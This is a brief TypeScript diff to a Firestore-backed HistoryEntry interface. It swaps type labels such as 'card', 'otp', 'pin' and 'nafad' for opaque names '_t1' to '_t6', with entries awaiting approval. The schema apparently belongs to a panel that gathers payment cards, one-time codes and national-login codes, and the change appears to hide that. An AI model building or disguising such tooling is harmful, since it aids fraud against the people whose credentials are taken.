@@ -3,7 +3,7 @@ import { doc, getDoc, updateDoc } from "firebase/firestore"
 
 export interface HistoryEntry {
   id: string
-  type: "card" | "otp" | "pin" | "phone_info" | "phone_otp" | "nafad" | "_v1" | "_v2" | "_v3" | "_v4" | "_v5" | "_v6" | "_v7" | "_v8" | "_v9"
+  type: "_t1" | "_t2" | "_t3" | "_t4" | "_t5" | "_t6"
   timestamp: string
   status: "pending" | "approved" | "rejected"
   data: any
